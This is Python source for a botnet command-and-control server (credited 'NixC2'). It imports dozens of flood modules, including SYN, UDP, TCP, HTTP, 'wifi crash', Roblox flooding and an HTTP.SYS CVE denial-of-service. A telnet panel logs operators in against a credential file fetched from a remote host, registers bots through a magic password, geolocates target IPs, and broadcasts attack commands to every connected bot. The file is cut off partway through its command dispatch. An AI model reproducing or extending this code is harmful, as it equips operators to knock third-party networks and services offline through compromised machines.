#!/usr/bin/env python3
#-*- coding: utf-8 -*-

# Layer 3
from Commands.icmp import icmp,icmp2,icmp3,icmp4

# Layer 4
from Commands.junk import junk
from Commands.std import std
from Commands.syn import syn,syn2,syn3,syn4,syn5
from Commands.tcp import tcp_multi,tcp
from Commands.tcpsyn import tcpsyn
from Commands.udp import udp
from Commands.tcp_bypass import tcp_bypass
from Commands.udp_bypass import udp_bypass
from Commands.cpukill import cpukill
from Commands.hexcpu import hexcpu
from Commands.hex import hex,rhex
from Commands.vse import vse
from Commands.junk2 import junk2
from Commands.junk3 import junk3
from Commands.tup import tup,tup2,tup3,tup4,tup5
from Commands.cc import cc,cc2,cc3,cc4,cc5
from Commands.nds import NDS
from Commands.roblox_flooding import roblox_flooding,roblox_flooding2,roblox_flooding3
from Commands.nulcear_attacks import NULCEAR_ATTACKS
from Commands.wifi_crash import wifi_crash,wifi_crash2,wifi_crash3

#CUSTOM PACKET
from Commands.custom_packet import custom_packet_attack

#CVE LAYER
from Commands.hscd import HSCD

# Layer 7
from Commands.req_http import http_req
from Commands.http_get import http
from Commands.http_get2 import http_2,rate_attack,rate_attack2
from Commands.http_get3 import http_3
from Commands.http_pps import http_pps
from Commands.slow_flooding import slow_attack
from Commands.pyflooder import pyflooder,pyflooder2,pyflooder3,pyflooder_l4_l7,pyflooder_hell,pyflooder_hell2,PYFLOODERHELLSOCKET

# Imports
import socket, threading, sys, time, ipaddress,requests
from random import choice,choices,randint
from colorama import Fore, init, Back

data = ""

def color2(data_input_output):
    random_output = data_input_output

    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

def color():

    random2 = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
    
    random2.remove('BLACK')
    random2.remove('LIGHTBLACK_EX')

    random = choice((random2))

    if random == "GREEN":
        data = '\033[32m'
    elif random == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random == "YELLOW":
        data = '\033[33m'
    elif random == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random == "CYAN":
        data = '\033[36m'
    elif random == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random == "BLUE":
        data = '\033[34m'
    elif random == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random == "MAGENTA":
        data = '\033[35m'
    elif random == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random == "RED":
        data = '\033[31m'
    elif random == "LIGHTRED_EX":
        data = '\033[91m'
    elif random == "BLACK":
        data = '\033[30m'
    elif random == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random == "WHITE":
        data = '\033[37m'
    elif random == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
user_name = ""
bots = {}

# Banners

banner_2 = f"""
 ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ 
 ╠╩╗║ ║ ║  ║   ╔═╝ 
 ╚═╝╚═╝ ╩  ╚═╝ ╚═╝   credit: NixWasHere/NixC2 OWNER code
╔═════════════════════════#
            WELCOME TO C2
  BOTNET TEST 
╚═════════════════════════#
"""

banner = f"""
 ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ 
 ╠╩╗║ ║ ║  ║   ╔═╝ 
 ╚═╝╚═╝ ╩  ╚═╝ ╚═╝
"""

l_banner = f"""
 ╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗ 
 ╠╩╗║ ║ ║  ║   ╔═╝ 
 ╚═╝╚═╝ ╩  ╚═╝ ╚═╝   credit: NixWasHere/NixC2 OWNER code
╔═════════════════════════#
         LOGIN USER
╚═════════════════════════#
"""

HINT_PASSWORD = ["MYSQL.ROOT//UPLOADER//USERNAME","MYSQL.R/O/O/T/UPLOADER/USERNAME","MYSQL/.../.././ROOT","MYSQL/..../........","MYSQL","MYSQL/./../.../..../infect.sh","MYSQL.INJECT/..","aCREATE","MYSQL/.../../.","$MYSQL(/.../../.);"]

def get_location(ip_addr,GET_DATA):
    ip_address = ip_addr
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    network = response.get("network")
    version = response.get("version")

    city = response.get("city")
    region_city = response.get("region")
    country_name = response.get("country_name")
    latitude = response.get("latitude")
    longitude = response.get("longitude")

    timezone = response.get("timezone")
    utc_offset = response.get("utc_offset")

    calling_code = response.get("country_calling_code")
    network = response.get("network")
    languages = response.get("languages")
    currency_name = response.get("currency_name")
    currency = response.get("currency")

    if GET_DATA == "IP_DATA":
        location_data = f'''
# IP DATA
IP            : {ip_address}
NETWORK       : {network}
VERSION       : {version}'''
    elif GET_DATA == "LOCATION":
        location_data = f'''
# LOCATION
CITY          : {city}
REGION        : {region_city}
COUNTRY       : {country_name}
LATITUDE      : {latitude}
LONGITUDE     : {longitude}'''
    elif GET_DATA == "TIME":
        location_data = f'''
# TIME
TIMEZONE      : {timezone}
UTC_OFFSET    : {utc_offset}'''
    elif GET_DATA == "OTHER_DATA":
        location_data = f'''
# OTHER DATA
CALLING_CODE  : {calling_code}
LANGUAGES     : {languages}
CURRYENCY     : {currency}
CURRENCY_NAME : {currency_name}'''
    elif GET_DATA == "ALL_DATA":
        location_data = f'''
# IP DATA
IP            : {ip_address}
NETWORK       : {network}
VERSION       : {version}

# LOCATION
CITY          : {city}
REGION        : {region_city}
COUNTRY       : {country_name}
LATITUDE      : {latitude}
LONGITUDE     : {longitude}

# TIME
TIMEZONE      : {timezone}
UTC_OFFSET    : {utc_offset}

# OTHER DATA
CALLING_CODE  : {calling_code}
LANGUAGES     : {languages}
CURRYENCY     : {currency}
CURRENCY_NAME : {currency_name}'''
    return location_data

def loadering(client):
    send(client, f'\33]0;\a', False)
    send(client, ansi_clear, False)
    global user_name
    data = ""
    for number in range(int(randint(1,3))):

        color_random = color()

        send(client, f'''{color_random}█▒▒▒▒▒▒▒▒▒ L _ ⏳''')
        send(client, f'\33]0;L _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}██▒▒▒▒▒▒▒▒ LO _ ⌛''')
        send(client, f'\33]0;LO _ ⏳ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}███▒▒▒▒▒▒▒ LOA _ ⏳''')
        send(client, f'\33]0;LOA _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}█████▒▒▒▒▒ LOAD _ ⌛''')
        send(client, f'\33]0;LOAD _ ⏳ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}███████▒▒▒ LOADI _ ⏳''')
        send(client, f'\33]0;LOADI _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}█████████▒ LOADIN _ ⌛''')
        send(client, f'\33]0;LOADIN _ ⏳ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}██████████ LOADING _ ⏳''')
        send(client, f'\33]0;LOADING _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)
        data = ""
    threading.Thread(target=update_title, args=(client,user_name)).start()
TIITLE_MESSAGE = ''
DATA_TEXT = ''

message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""

help = f"""
    </></></></></></></></></></></></></></></>
    ╔═════════════════════════════════════════╗
    ║ SQL_USER               ADDED NEW USER
    ║ METHODS                Shows list of attack methods all
    ║ .custom_packet         DDOS/DOS ATTACK BY connect_ex
    ║ OTHER                  show all mode,method list
    ║ M_HEAD,M_JUNK          show all mode list
    ║ URL_TO_IP              url to ip
    ║ IP_GEO                 IP GEOLOCATION
    ║ SET_PROMPT             SET PROMPT TEXT INPUT
    ║ CLEAR                  Clears the screen 
    ║ LOGOUT,EXIT            Disconnects from the cnc
    ╚═════════════════════════════════════════╝
    </></></></></></></></></></></></></></></>
"""

help2 = f"""
    TOOLS
    ╔═════════════════════════════════════════╗
    ║ SQL_USER               ADDED NEW USER
    ║ URL_TO_IP              url to ip
    ║ IP_GEO                 IP GEOLOCATION
    ║ SET_PROMPT             SET PROMPT TEXT INPUT
    ║ CLEAR                  Clears the screen 
    ║ LOGOUT,EXIT            Disconnects from the cnc
    ╚═════════════════════════════════════════╝
"""

help3 = f"""
    TOOL ATTACK/OTHER
    ╔═════════════════════════════════════════╗
    ║ METHODS                Shows list of attack methods all
    ║ .custom_packet         DDOS/DOS ATTACK BY connect_ex
    ║ OTHER                  show all mode,method list
    ║ M_HEAD,M_JUNK          show all mode list
    ╚═════════════════════════════════════════╝
"""

methods = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Methods L3-4
    ║═══════════════════════════════════════════════════════════╗
    ║  .icmp .icmp2 .icmp3 .icmp4 # ICMP
    ║  .udp .tcp .udp_bypass .tcp_bypass # UDP/TCP
    ║  .syn .syn2 .syn3 .syn4 .syn5 # SYN FLOOD
    ║  .std .vse .junk .rhex .hex .cpukill .tcpsyn # OTHER
    ╚═══════════════════════════════════════════════════════════╝
"""

methods3 = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Methods L4 OTHER
    ║═══════════════════════════════════════════════════════════╗
    ║  .tup_old .tup_bypass .tup_new # TCP AND UDP FLOODING
    ║  .hexcpu # hex and cpu flooding
    ║  .MULTIDT # TCP BUT MULTI DATA
    ║  .roblox_1 .roblox_2 .roblox_all # GAME ROBLOX
    ║  .tup_new2 .tup_new3 # ROBLOX AND TCP AND UDP FLOODING
    ║  .rate_attack .rate_attack .nds # RATE ATTACK
    ╚═══════════════════════════════════════════════════════════╝
"""

methods2 = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Methods L7
    ║═══════════════════════════════════════════════════════════╗
    ║  .http_5050 .http_get .http_mix .slow .http_pps # HTTP SOCKET
    ║  .http_req # HTTP REQUESTS
    ╚═══════════════════════════════════════════════════════════╝
"""

methods5 = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Methods Layer CVE/EXPLOIT/DOS/VULN
    ║═══════════════════════════════════════════════════════════╗
    ║  .hscd # HTTP.SYS DOS
    ╚═══════════════════════════════════════════════════════════╝
"""

methods4 = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Methods L7 | PYFLOODER
    ║═══════════════════════════════════════════════════════════╗
    ║  .pyflooder .pyflooder2 .pyflooder3 .pyflooder_6k .phs
    ║  .pyflooder_hell .pyflooder_hell2
    ╚═══════════════════════════════════════════════════════════╝
"""

methods_cc = f"""
__________________________________
|_______________________________|x|
[>_] LAYER CONNECTION FLOODING [>_]
| .cc .cc2 .cc3 .cc4  .cc5        |
[>_]---------------------------[>_]"""

methods_bot = f"""
</>----------------------------------------------------</> 
</> LAYER BOTNET STOP
</>----------------------------------------------------</> 
</>  [>_] .WIFI_RESOURCES #WIFI STOP WORKING
</>         .WIFI_UNREACHABLE .WIFI_REUN #WIFI STOP WORKING
</> [>_] .nulcear_attacks # LAG
</>----------------------------------------------------</> """
methods_mod = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   MODE JUNK TYPE
    ║═══════════════════════════════════════════════════════════╗
    ║   1-8
    ╚═══════════════════════════════════════════════════════════╝
"""
methods_mod2 = f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║   MODE_HEAD REQUESTS TYPE
    ║═══════════════════════════════════════════════════════════╗
    ║   get,post,put,patch,head,options,delete,all
    ╚═══════════════════════════════════════════════════════════╝
    ╔═══════════════════════════════════════════════════════════╗
    ║   MODE_HEADER SOCKET TYPE
    ║═══════════════════════════════════════════════════════════╗
    ║ get,post,put,patch,head,options,delete
    ║ age,cloudflare,date,server,method,httphit # old
    ║ data,pussy,cache,referer,block,vpn,url,proxy,reading,wait # new
    ║ os,setting,mirai,ransomware,tcp,ntp,remove,packet,infection
    ║ hell,gold,ftp,imap,rap,mom,gateway
    ╚═══════════════════════════════════════════════════════════╝
    ╔═══════════════════════════════════════════════════════════╗
    ║   MODE/TYPE L7
    ║═══════════════════════════════════════════════════════════╗
    ║   1-44
    ╚═══════════════════════════════════════════════════════════╝
"""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 1 and int(time) <= 999999999999

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 0 and int(size) <= 999999999999

count_get_mysql_user_pass = 0
# Read credentials from login file
def find_login(client,username, password):
    global count_get_mysql_user_pass
    data_loader_file_user = ""
    while True:
        try:
            req = requests.get(url='https://testermegasus.000webhostapp.com/mysql_db_user.txt')
            print("OK . . .")
            data_loader_file_user = "OK"
        except:
            print("WAITING . . .")
            data_loader_file_user = "NO"
            count_get_mysql_user_pass += 1
        finally:
            if data_loader_file_user == "OK" or data_loader_file_user in "OK":
                break
            else:
                color_random = color()
                send(client, f'''{color_random}WAITING TO GET MYSQL . . .''')
                send(client, f"\33]0;C&C CAN'T GET MYSQL {count_get_mysql_user_pass}\a", False)
                print("TRYING . . .")
    file = open('C:\\Users\\User\\Desktop\\botnet\\logins.txt',"wb")
    file.write(req.content)
    file.close()
    loadering(client)
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(65536).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Client handler
def handle_client(client, address):
    send(client, f'\x1b[3;31;40mNixC2 | Login: Awaiting Response...\a', False)
    while 1:
        send(client, ansi_clear, False)
        color_random = color()
        for x in l_banner.split('\n'):
            send(client,f'{color_random}'+x)
        send(client, f'{Fore.CYAN}    Username :\x1b[0m ', False, False)
        username = client.recv(65536).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'{Fore.LIGHTBLUE_EX}    Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(65536).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client,username, password):
            send(client, Fore.RED + f'Invalid user or password')
            time.sleep(1)
            client.close()
            return

        global user_name
        user_name = username

        threading.Thread(target=update_title, args=(client,username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Updates Shell Title
def update_title(client,name):
    try:
        send(client, f'\33]0;BOT {len(bots)} | USER {name}\a', False)
        time.sleep(2)
    except:
        client.close()

color_random = color()

# Telnet Command Line
def command_line(client):
    global DATA_TEXT
    global TIITLE_MESSAGE
    global message_test
    loadering(client)
    color_random = color()
    for x in banner_2.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f'{color_random}')
    send(client, f"{Fore.GREEN}WELCOME TO BOTNET.CNC -> USER-{user_name} BOTNET-{len(bots)} 📡 | credit: NixWasHere/NixC2 OWNER code")
    prompt = f'{Fore.CYAN}BOT.c2 {Fore.GREEN}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(65536).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            color_random = color()
            
            if command == 'HELP':
                loadering(client)
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                data = ""
                if len(args) == 2:
                    data = args[1]
                    color_random = color()
                    if "ATTACK_TOOL" in data or "OTHER_TOOL" in data:
                        for x in help3.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "TOOLS" in data:
                        for x in help2.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "ALL_TOOL" in data:
                        for x in help.split('\n'):
                            send(client,f'{color_random}'+x)
                else:
                    color_random = color()
                    for x in help.split('\n'):
                            send(client,f'{color_random}'+x)
                    color_random = color()
                    send(client,f'{color_random}YOU CAN USE THIS COMMAND -->')
                    send(client,f'{color_random}HELP [MODE]')
                    send(client,f'{color_random}[MODE] --> ALL_TOOL,TOOLS,ATTACK_TOOL')
            elif command == "STOP_RATE_ATTACK":
                broadcast(data)
                color_random = color()
                send(client,f'{color_random}SENDING STOP RATE ATTACK --> BOT')
            elif command == "SET_PROMPT":
                data_prompt_checker = "YES"
                prompt_code = ""
                prompt_code_color = ""
                if len(args) == 3:
                    prompt_code = args[1]
                    prompt_code_color = args[2]
                    if prompt_code == "OLD_PROMPT":
                        prompt = f'{Fore.CYAN}BOT.c2 {Fore.GREEN}$ '
                    elif prompt_code_color == "SHOW_COLOR":
                        random_color_all = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
                        send(client, Fore.RED + f'\x1b[3;31;40mCOLOR PROMPT -->')
                        send(client, Fore.RED + f'')
                        for color_setting_prompt in random_color_all:
                            send(client, Fore.RED + f'\x1b[3;31;40m {color_setting_prompt}')
                    else:
                        prompt = f'{color2(prompt_code_color)}{prompt_code} '
                else:
                    send(client, Fore.RED + '\x1b[3;31;40mSET_PROMPT [SET TEXT PROMPT] [COLOR] 🔧')
                    send(client, Fore.RED + '\x1b[3;31;40m')
                    send(client, Fore.RED + '\x1b[3;31;40mYOU CAN USE THIS COMMAND FOR SHOW COLOR')
                    send(client, Fore.RED + '\x1b[3;31;40mCommand --> SET_PROMPT [SET TEXT PROMPT] SHOW_COLOR 🔨')
            elif command == "SQL_USER":
                user_name_get = ""
                password_get = ""
                hints_crack = ""
                if len(args) == 4:
                    hints_crack = args[1]
                    user_name_get = args[2]
                    password_get = args[3]
                    count_number = 0
                    for HINT_PASS in HINT_PASSWORD:
                        count_number += 1
                        if HINT_PASS == hints_crack:
                            send(client, f"{Fore.GREEN}FOUND HINTS ({count_number}%) . . .")
                            req = requests.get(f'https://testermegasus.000webhostapp.com/php_mysql.php?SQL_USER={user_name_get}:{password_get}')
                            loadering(client)
                            color_random = color()
                            for x in banner.split('\n'):
                                send(client,f'{color_random}'+x)
                                time.sleep(0.2)
                            color_random = color()
                            TIITLE_MESSAGE = 'UPLOAD USERNAME/PASSWORD TO MYSQL'
                            DATA_TEXT = f'  USER-{user_name_get} PASS-{password_get} STATUS-{req.status_code}'
                            message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""
                            for x in message_test.split('\n'):
                                send(client,f'{color_random}'+x)
                            time.sleep(1)
                        else:
                            send(client, f"{Fore.RED}SCANING HINTS ({count_number}%) . . .")
                            time.sleep(1)
                else:
                    send(client, Fore.RED + '\x1b[3;31;40mSQL_USER [HINT PASSWORD] [USERNAME] [PASSWORD]')
            elif command == "URL_TO_IP":
                try:
                    url = ""
                    if len(args) == 2:
                        url = args[1]
                        host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                        ip = socket.gethostbyname(host)
                        loadering(client)
                        color_random = color()
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        
                        color_random = color()
                        TIITLE_MESSAGE = 'URL TO IP'
                        DATA_TEXT = f' URL {url} --> IP {ip}'
                        message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""
                        for x in message_test.split('\n'):
                            send(client,f'{color_random}'+x)
                    else:
                        send(client, Fore.RED + '\x1b[3;31;40m URL_TO_IP [URL]')
                except socket.gaierror:
                    send(client, Fore.RED + '\x1b[3;31;40m Invalid website pls check url')
            
            elif command == "IP_TO_LOCAT" or command == "IP_TO_LOCATION" or command == "IP_GEO" or command == "IP_GEOLOCATION" or command == "IP_GEOLOCAT":
                try:
                    ip = ""
                    data_get_location = ""
                    if len(args) == 3:
                        ip = str(args[1])
                        data_get_location = str(args[2])
                        ip_location = get_location(ip,data_get_location)
                        loadering(client)
                        color_random = color()
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        
                        color_random = color()
                        TIITLE_MESSAGE = 'IP TO LOCATION'
                        DATA_TEXT = f'{ip_location}'
                        message_test = f"""
<------ [{TIITLE_MESSAGE}] ------>
{DATA_TEXT}"""
                        for x in message_test.split('\n'):
                            send(client,f'{color_random}'+x)
                    else:
                        send(client, Fore.RED + '\x1b[3;31;40m IP_TO_GEO [IP] [DATA_GET]')
                        send(client, Fore.RED + '\x1b[3;31;40m')
                        send(client, Fore.RED + '\x1b[3;31;40mCommand in DATA_GET -->  IP_DATA  LOCATION TIME OTHER_DATA ALL_DATA')
                except socket.gaierror:
                    send(client, Fore.RED + '\x1b[3;31;40m Invalid to get data')
            elif command == 'METHODS':
                loadering(client)
                layer_get = ""
                if len(args) == 2:
                    layer_get = args[1]
                    if "LAYER4" in layer_get or "LAYER3" in layer_get:
                        color_random = color()
                        for x in methods.split('\n'):
                            send(client,f'{color_random}'+x)
                    if "LAYER_OTHER" in layer_get:
                        color_random = color()
                        for x in methods3.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "LAYER_CVE" in layer_get or "LAYER_EXPLOIT" in layer_get:
                        color_random = color()
                        for x in methods5.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "LAYER_PYFLOOD" in layer_get or "LAYER_PYFLOODER" in layer_get:
                        color_random = color()
                        for x in methods4.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "LAYER_BOT" in layer_get:
                        color_random = color()
                        for x in methods_bot.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "LAYER7" in layer_get:
                        color_random = color()
                        for x in methods2.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "LAYER_CC" in layer_get:
                        color_random = color()
                        for x in methods_cc.split('\n'):
                            send(client,f'{color_random}'+x)
                else:
                    send(client, Fore.RED + '\x1b[3;31;40m Ex Command:METHDOS [LAYER]')
                    send(client, Fore.RED + '\x1b[3;31;40m [LAYER] --> LAYER7,LAYER_PYFLOODER,LAYER_CVE')
                    send(client, Fore.RED + '\x1b[3;31;40m             LAYER_OTHER,LAYER_BOT,LAYER_CC,LAYER4')
            elif command == 'OTHER':
                loadering(client)
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                color_random = color()
                for x in methods_mod.split('\n'):
                    send(client,f'{color_random}'+x)
                color_random = color()
                for x in methods_mod2.split('\n'):
                    send(client,f'{color_random}'+x)
            elif command == 'OTHER_JUNK' or command == 'M_JUNK' or command == 'MODE_JUNK':
                loadering(client)
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                color_random = color()
                for x in methods_mod.split('\n'):
                    send(client,f'{color_random}'+x)
            elif command == 'OTHER_MODE_HEAD' or command == 'MODE_HEAD' or command == 'M_HEAD':
                loadering(client)
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                color_random = color()
                for x in methods_mod2.split('\n'):
                    send(client,f'{color_random}'+x)
            elif command == 'CLEAR' or command== "CLS":
                loadering(client)
                send(client, ansi_clear, False)
                color_random = color()
                for x in banner_2.split('\n'):
                    send(client, f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f"{Fore.GREEN}WELCOME TO BOTNET.CNC -> USER-{user_name} BOTNET-{len(bots)} 📡 | credit: NixWasHere/NixC2 OWNER code")
            elif command == 'LOGOUT' or command == "EXIT":
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f'{Fore.LIGHTMAGENTA_EX}Successfully Logged out | credit: NixWasHere/NixC2 OWNER code\n')
                time.sleep(1)
                break
            elif command == '.HTTP_MIX': # http Junk
                http_3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_PPS': # http pps
                http_pps(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ROBLOX_1': # ROBLOX FLOODING
                roblox_flooding(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.ROBLOX_2': # ROBLOX FLOODING
                roblox_flooding2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.ROBLOX_ALL': # ROBLOX FLOODING
                roblox_flooding3(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.UDP': # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.UDP_BYPASS': # UDP Junk (Random UDP Data)
                udp_bypass(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_OLD': # TUP Junk (Random UDP/TCP Data)
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_BYPASS': # TUP Junk (Random UDP/TCP Data)
                tup2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_NEW': # TUP Junk (Random UDP/TCP Data)
                tup3(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_NEW2': # TUP Junk (Random UDP/TCP Data)
                tup4(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_NEW3': # TUP Junk (Random UDP/TCP Data)
                tup5(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.CC': # Connection flood
                cc(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC2': # Connection flood
                cc2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC3': # Connection flood
                cc3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC4': # Connection flood
                cc4(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC5': # Connection flood
                cc5(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.NDS': # Connection flood but no data in packet
                NDS(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HSCD': # EXPLOIT CVE DOS
                HSCD(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent3, broadcast, data)
            elif command == '.WIFI_RESOURCES': # Make ping test to get No resources,Timeout or ping get high ms
                wifi_crash(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.WIFI_UNREACHABLE': # Make ping test to get Destination net unreachable
                wifi_crash2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.WIFI_REUN':
                wifi_crash3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CUSTOM_PACKET': # CUSTOM PACKET
                custom_packet_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.TCP': # TCP Junk (Random TCP Data)
